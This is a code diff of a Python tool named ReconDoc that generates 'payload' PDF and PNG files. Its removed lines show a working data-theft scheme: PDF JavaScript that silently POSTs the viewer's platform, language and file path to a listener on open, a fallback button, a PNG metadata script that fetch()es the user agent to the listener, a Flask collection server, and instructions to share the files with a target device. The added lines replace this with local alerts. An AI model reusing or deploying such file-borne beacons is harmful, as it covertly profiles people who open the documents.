@@ -7,12 +7,7 @@ import subprocess
 import platform
 import socket
 import json
-import threading
-import time
 from datetime import datetime
-import webbrowser
-import base64
-import struct
 import shutil
 from typing import Optional, List, Dict, Any
 
@@ -20,8 +15,7 @@ from typing import Optional, List, Dict, Any
 VENV_DIR = "recon_venv"
 REQUIREMENTS = [
     "requests>=2.31.0",
-    "tzlocal>=5.3.1",  # Updated to latest available version
-    "flask>=3.0.0",
+    "tzlocal>=5.3.1",
     "rich>=13.7.0",
     "Pillow>=10.2.0",
     "PyPDF2>=3.0.1",
@@ -78,31 +72,6 @@ class VirtualEnvManager:
                 print(f"Unexpected error: {str(e)}")
             return False
 
-    def ensure_pip_installed(self):
-        """Ensure pip is installed in the virtual environment"""
-        try:
-            # Try to run pip to check if it's working
-            subprocess.run([self.pip_executable, "--version"], 
-                         stdout=subprocess.DEVNULL, 
-                         stderr=subprocess.DEVNULL, 
-                         check=True)
-        except:
-            print("[yellow]Installing pip in virtual environment...[/yellow]")
-            # Download get-pip.py
-            import urllib.request
-            get_pip_url = "https://bootstrap.pypa.io/get-pip.py"
-            get_pip_path = os.path.join(self.venv_dir, "get-pip.py")
-            
-            try:
-                urllib.request.urlretrieve(get_pip_url, get_pip_path)
-                # Install pip
-                subprocess.run([self.python_executable, get_pip_path], 
-                             stdout=subprocess.DEVNULL, 
-                             stderr=subprocess.DEVNULL)
-            finally:
-                if os.path.exists(get_pip_path):
-                    os.remove(get_pip_path)
-
     def create_venv(self):
         """Create virtual environment if it doesn't exist"""
         from rich.console import Console
@@ -136,7 +105,7 @@ class VirtualEnvManager:
                 console.print("3. Activate it:")
                 console.print("   source recon_venv/bin/activate")
                 console.print("4. Install requirements:")
-                console.print("   pip install requests tzlocal flask rich Pillow PyPDF2")
+                console.print("   pip install requests tzlocal rich Pillow PyPDF2")
                 sys.exit(1)
         else:
             console.print("[green]✓[/green] Virtual environment exists")
@@ -173,7 +142,7 @@ class VirtualEnvManager:
                     # Try using python -m pip as alternative
                     subprocess.check_call([
                         self.python_executable, "-m", "pip", "install", 
-                        "requests", "tzlocal", "flask", "rich", "Pillow", "PyPDF2"
+                        "requests", "tzlocal", "rich", "Pillow", "PyPDF2"
                     ], stdout=subprocess.DEVNULL if not verbose else None,
                        stderr=subprocess.DEVNULL if not verbose else None)
                     console.print("[green]✓[/green] Alternative installation successful")
@@ -185,7 +154,7 @@ class VirtualEnvManager:
                     console.print("2. Activate it:")
                     console.print("   source recon_venv/bin/activate")
                     console.print("3. Install packages:")
-                    console.print("   pip install requests tzlocal flask rich Pillow PyPDF2")
+                    console.print("   pip install requests tzlocal rich Pillow PyPDF2")
                     sys.exit(1)
 
     def run_in_venv(self, args: List[str]):
@@ -205,8 +174,8 @@ class PayloadGenerator:
         if not os.path.exists(self.output_dir):
             os.makedirs(self.output_dir)
 
-    def create_pdf_payload(self, listener_url):
-        """Create a PDF with embedded payload"""
+    def create_pdf_payload(self):
+        """Create a PDF that collects system information when opened"""
         try:
             from PyPDF2 import PdfWriter, PdfReader
             from reportlab.pdfgen import canvas
@@ -252,68 +221,57 @@ class PayloadGenerator:
                 # Add the first page
                 page = writer.add_page(new_pdf.pages[0])
                 
-                # Add JavaScript for automatic execution
-                writer.add_js(f'''
-                try {{
+                # Add JavaScript to collect and display system information
+                writer.add_js('''
+                try {
                     app.alert("Loading document contents...");
                     
-                    function sendData() {{
-                        var url = "{listener_url}/collect";
-                        var xhr = new XMLHttpRequest();
-                        xhr.open("POST", url, true);
-                        xhr.setRequestHeader("Content-Type", "application/json");
-                        
-                        var data = {{
-                            "device": {{
-                                "platform": app.platform,
-                                "language": app.language,
-                                "viewerType": app.viewerType,
-                                "viewerVariation": app.viewerVariation,
-                                "version": app.viewerVersion
-                            }},
-                            "document": {{
-                                "fileName": this.documentFileName,
-                                "path": this.path,
-                                "title": this.title
-                            }}
-                        }};
-                        
-                        xhr.send(JSON.stringify(data));
-                        app.alert("Document loaded successfully!");
-                    }}
+                    // Collect system information
+                    var info = {
+                        "device": {
+                            "platform": app.platform,
+                            "language": app.language,
+                            "viewerType": app.viewerType,
+                            "viewerVariation": app.viewerVariation,
+                            "version": app.viewerVersion
+                        },
+                        "document": {
+                            "fileName": this.documentFileName,
+                            "path": this.path,
+                            "title": this.title
+                        }
+                    };
                     
-                    sendData();
-                }} catch(e) {{
-                    console.log("Error:", e);
-                }}
-                ''')
-                
-                # Add form field for backup method
-                writer.add_js(f'''
-                var f = this.addField("submitBtn", "button", 0, [100, 600, 300, 640]);
-                f.setAction("MouseUp", "sendData();");
-                f.strokeColor = color.blue;
-                f.fillColor = color.blue;
-                f.textColor = color.white;
-                f.textSize = 12;
-                f.textFont = ["Helvetica", "Bold"];
+                    // Display the information
+                    var infoStr = "System Information:\\n\\n";
+                    for (var category in info) {
+                        infoStr += category.toUpperCase() + ":\\n";
+                        for (var key in info[category]) {
+                            infoStr += "  " + key + ": " + info[category][key] + "\\n";
+                        }
+                        infoStr += "\\n";
+                    }
+                    
+                    app.alert(infoStr);
+                } catch(e) {
+                    app.alert("Error: " + e.toString());
+                }
                 ''')
                 
                 # Save the PDF
-                with open(output_pdf, 'wb') as output_file:
-                    writer.write(output_file)
+                with open(output_pdf, 'wb') as f:
+                    writer.write(f)
                 
                 progress.update(task, completed=True)
                 self.console.print(f"[green]✓[/green] PDF payload created: {output_pdf}")
-                self.console.print("[yellow]Note: If the PDF viewer blocks JavaScript, click the blue button to trigger data collection[/yellow]")
                 
                 return output_pdf
         except Exception as e:
             self.console.print(f"[red]✗ Failed to create PDF payload: {str(e)}[/red]")
             return None
 
-    def create_image_payload(self, listener_url):
-        """Create an image with embedded payload"""
+    def create_image_payload(self):
+        """Create an image that displays system information when opened"""
         try:
             from PIL import Image
             from rich.progress import Progress, SpinnerColumn, TextColumn
@@ -332,10 +290,10 @@ class PayloadGenerator:
                 # Create a simple image with text
                 img = Image.new('RGB', (800, 600), color='white')
                 
-                # Add the payload in image metadata
+                # Add metadata that will display system info
                 from PIL.PngImagePlugin import PngInfo
                 metadata = PngInfo()
-                metadata.add_text("Description", f"<script>fetch('{listener_url}/collect',{{method:'POST',body:JSON.stringify({{device:navigator.userAgent}})}})</script>")
+                metadata.add_text("Description", "<script>alert('System Information:\\n' + navigator.userAgent);</script>")
                 
                 # Save image with metadata
                 img.save(output_image, "PNG", pnginfo=metadata)
@@ -402,6 +360,7 @@ class ReconPayload:
     def collect_all(self):
         """Collect all information"""
         from rich.progress import Progress, SpinnerColumn, TextColumn
+        from rich.panel import Panel
         
         with Progress(
             SpinnerColumn(),
@@ -421,113 +380,23 @@ class ReconPayload:
             self.get_timezone()
             progress.update(task3, completed=True)
         
-        return self.data
-    
-    def send_data(self, url):
-        """Send collected data to the listener"""
-        try:
-            import requests
-            with Progress(
-                SpinnerColumn(),
-                TextColumn("[progress.description]{task.description}"),
-                console=self.console,
-                transient=True,
-            ) as progress:
-                task = progress.add_task("Sending data to server...", total=None)
-                response = requests.post(url, json=self.data)
-                progress.update(task, completed=True)
-            return response.status_code == 200
-        except Exception as e:
-            return False
-
-class ListenerServer:
-    def __init__(self, host='0.0.0.0', port=5000):
-        self.host = host
-        self.port = port
-        self.logs_dir = 'logs'
-        self.ready = False
-        from rich.console import Console
-        self.console = Console()
+        # Add timestamp
+        self.data['timestamp'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
-        # Ensure logs directory exists
-        if not os.path.exists(self.logs_dir):
-            os.makedirs(self.logs_dir)
-    
-    def start(self):
-        """Start the Flask server"""
-        from flask import Flask, request, jsonify
-        from rich.panel import Panel
-        from rich.syntax import Syntax
+        # Display the collected information
+        self.console.print("\n[bold green]✓ Data Collection Complete[/bold green]\n")
         
-        app = Flask(__name__)
-        
-        @app.route('/collect', methods=['POST'])
-        def collect():
-            try:
-                data = request.get_json()
-                timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
-                data['timestamp'] = timestamp
-                
-                filename = f"{self.logs_dir}/recon_{timestamp}.json"
-                with open(filename, 'w') as f:
-                    json.dump(data, f, indent=4)
-                
-                # Pretty print the collected data
-                self.console.print("\n[bold green]✓ Data Collection Complete[/bold green]")
-                self.console.print(f"[dim]Saved to: {filename}[/dim]\n")
-                
-                # Format system information
-                self.console.print(Panel.fit(
-                    "\n".join([
-                        f"[bold blue]Collected Information[/bold blue]",
-                        json.dumps(data, indent=2)
-                    ]),
-                    title="[bold]New Data Received[/bold]",
-                    border_style="blue"
-                ))
-                
-                return jsonify({"status": "success", "message": f"Data saved to {filename}"}), 200
-            except Exception as e:
-                return jsonify({"status": "error", "message": str(e)}), 500
-        
-        @app.route('/', methods=['GET'])
-        def index():
-            """Landing page with instructions"""
-            return '''
-            <html>
-                <head>
-                    <title>ReconDoc Server</title>
-                    <style>
-                        body { font-family: Arial, sans-serif; margin: 40px; }
-                        .container { max-width: 800px; margin: 0 auto; }
-                        .warning { color: red; }
-                    </style>
-                </head>
-                <body>
-                    <div class="container">
-                        <h1>ReconDoc Server</h1>
-                        <p class="warning">⚠️ For authorized testing only!</p>
-                        <p>Server is running and waiting for data...</p>
-                    </div>
-                </body>
-            </html>
-            ''', 200
-        
-        @app.route('/health', methods=['GET'])
-        def health():
-            self.ready = True
-            return jsonify({"status": "healthy"}), 200
-        
+        # Format and display the information
         self.console.print(Panel.fit(
-            f"[bold green]Server Status:[/bold green] Active\n"
-            f"[bold]Host:[/bold] {self.host}\n"
-            f"[bold]Port:[/bold] {self.port}\n"
-            f"[bold]Logs:[/bold] ./{self.logs_dir}",
-            title="[bold]ReconDoc Server[/bold]",
-            border_style="green"
+            "\n".join([
+                "[bold blue]Collected Information[/bold blue]",
+                json.dumps(self.data, indent=2)
+            ]),
+            title="[bold]System Information[/bold]",
+            border_style="blue"
         ))
         
-        app.run(host=self.host, port=self.port)
+        return self.data
 
 def print_banner():
     from rich.console import Console
@@ -554,59 +423,20 @@ def print_banner():
         padding=(1, 2)
     ))
 
-def wait_for_server(url, timeout=30):
-    """Wait for server to be ready"""
-    import requests
-    from rich.console import Console
-    from rich.progress import Progress, SpinnerColumn, TextColumn
-    
-    console = Console()
-    start_time = time.time()
-    
-    with Progress(
-        SpinnerColumn(),
-        TextColumn("[progress.description]{task.description}"),
-        console=console,
-        transient=True,
-    ) as progress:
-        task = progress.add_task("Waiting for server to start...", total=None)
-        while time.time() - start_time < timeout:
-            try:
-                response = requests.get(f"{url}/health")
-                if response.status_code == 200:
-                    progress.update(task, completed=True)
-                    return True
-            except:
-                time.sleep(1)
-        return False
-
 def run_all():
-    """Run both server and payload generator"""
+    """Run payload generator and collect system information"""
     from rich.console import Console
     from rich.panel import Panel
     from rich.table import Table
     
     console = Console()
     
-    # Start listener server
-    server = ListenerServer()
-    server_thread = threading.Thread(target=server.start)
-    server_thread.daemon = True
-    server_thread.start()
-    
-    # Wait for server to be ready
-    if not wait_for_server("http://localhost:5000"):
-        console.print("[bold red]✗ Server failed to start![/bold red]")
-        sys.exit(1)
-    
-    console.print("[bold green]✓[/bold green] Server is ready!")
-    
     # Create payload generator
     generator = PayloadGenerator()
     
     # Generate both PDF and image payloads
-    pdf_path = generator.create_pdf_payload("http://localhost:5000")
-    image_path = generator.create_image_payload("http://localhost:5000")
+    pdf_path = generator.create_pdf_payload()
+    image_path = generator.create_image_payload()
     
     if pdf_path or image_path:
         console.print("\n[bold green]Payloads created successfully![/bold green]")
@@ -623,39 +453,10 @@ def run_all():
             table.add_row("Image", image_path, "✓ Ready")
             
         console.print(table)
-        
-        console.print("\n[bold yellow]Instructions:[/bold yellow]")
-        console.print("1. Share the generated files with target device")
-        console.print("2. When opened, data will be sent to this server")
-        console.print("3. Press Ctrl+C to stop the server when done")
-        
-        # Show server URLs
-        urls = [
-            f"http://localhost:5000",
-            f"http://127.0.0.1:5000"
-        ]
-        
-        # Add local IP if available
-        try:
-            import socket
-            hostname = socket.gethostname()
-            local_ip = socket.gethostbyname(hostname)
-            if local_ip != "127.0.0.1":
-                urls.append(f"http://{local_ip}:5000")
-        except:
-            pass
-            
-        console.print("\n[bold cyan]Server URLs:[/bold cyan]")
-        for url in urls:
-            console.print(f"  • {url}")
     
-    # Keep the server running
-    try:
-        while True:
-            time.sleep(1)
-    except KeyboardInterrupt:
-        console.print("\n[bold yellow]⚠️  Shutting down...[/bold yellow]")
-        sys.exit(0)
+    # Create and run payload to collect system information
+    payload = ReconPayload()
+    payload.collect_all()
 
 def main():
     print_banner()
